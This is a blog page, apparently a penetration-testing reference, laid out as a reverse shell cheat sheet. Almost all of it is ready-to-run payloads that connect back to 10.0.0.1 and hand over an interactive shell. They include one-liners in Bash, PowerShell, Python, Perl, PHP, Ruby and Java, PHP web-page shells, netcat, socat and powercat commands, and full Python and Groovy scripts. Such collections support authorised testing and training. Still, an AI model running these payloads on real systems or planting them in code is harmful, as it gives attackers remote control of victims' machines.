_[<-- Home](https://flast101.github.io)_

# Reverse Shell Cheat Sheet

You can find them all artound the internet. I couldn't find them all in one place, so I write them down here. Don't hesitate to tell me if you find some more and I will add them to this list.

## One-liners

**Bash**

```
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
```


**PowerShell** 

```powershell
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('10.0.0.1',1234);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -Name System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

**Python**

```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```


**Perl**

```perl
perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```


**PHP**

```php
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```


**Ruby**

```ruby
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```


**Java**

```java
r = Runtime.getRuntime(); p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/1234;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[]); p.waitFor();
```


**Telnet**

```
telnet localhost 443 | /bin/sh | telnet localhost 444
```


**Xterm**

```
xterm -display 10.0.0.1:1
```

* * * 


## PHP Web Pages

**Linux**
~~~
<?php echo shell_exec("/bin/bash -c 'bash -i >& /dev/tcp/10.0.0.1/1234 0>&1'")?>
~~~

**Windows**

```
<?php echo shell_exec("powershell -c "$client = New-Object System.Net.Sockets.TCPClient('10.0.0.1',1234);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -Name System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"")?>
```

* * *

## Tools

**Netcat**

```
nc -e /bin/sh 10.0.0.1 1234
```

**Netcat without -e #1**

```
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.0.0.1 1234 > /tmp/f
```

**Netcat without -e #2**

```
nc localhost 443 | /bin/sh | nc localhost 444
```
 
**Socat**

```
user@ubuntu:~$ socat - TCP4:10.0.0.1:4444 EXEC:'/bin/bash -li'
C:\> socat TCP4:10.0.0.1:1234 EXEC:'cmd.exe'
```


**Powercat**

```
powercat -c 10.0.0.1 -p 1234 -e cmd.exe
```

* * *
## Others

**Powershell**

```powershell
$client = New-Object System.Net.Sockets.TCPClient('10.0.0.1',1234);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
{
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush();
}
$client.Close();
```


**Python for Linux**

```python
#!/usr/bin/env python
import socket
import subprocess
import os

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.0.0.1",666))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
```

**Python for Windows**

```python
import os,socket,subprocess,threading;
def s2p(s, p):
    while True:
        data = s.recv(1024)
        if len(data) > 0:
            p.stdin.write(data)
            p.stdin.flush()

def p2s(s, p):
    while True:
        s.send(p.stdout.read(1))

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.0.0.1",666))

p=subprocess.Popen(["\\windows\\system32\\cmd.exe"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)

s2p_thread = threading.Thread(target=s2p, args=[s, p])
s2p_thread.daemon = True
s2p_thread.start()

p2s_thread = threading.Thread(target=p2s, args=[s, p])
p2s_thread.daemon = True
p2s_thread.start()

try:
    p.wait()
except KeyboardInterrupt:
    s.close()
```

**Groovy**

```groovy
String host="10.0.0.1";
int port=1234;
String cmd="/bin/sh";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

**PHP**

The very good Pentestmonkey [php reverse shell](https://github.com/flast101/reverse-shell-cheatsheet/blob/master/php-reverse-shell.php).




_[<-- Home](https://flast101.github.io)_

<!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-173692234-1"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-173692234-1');
</script>


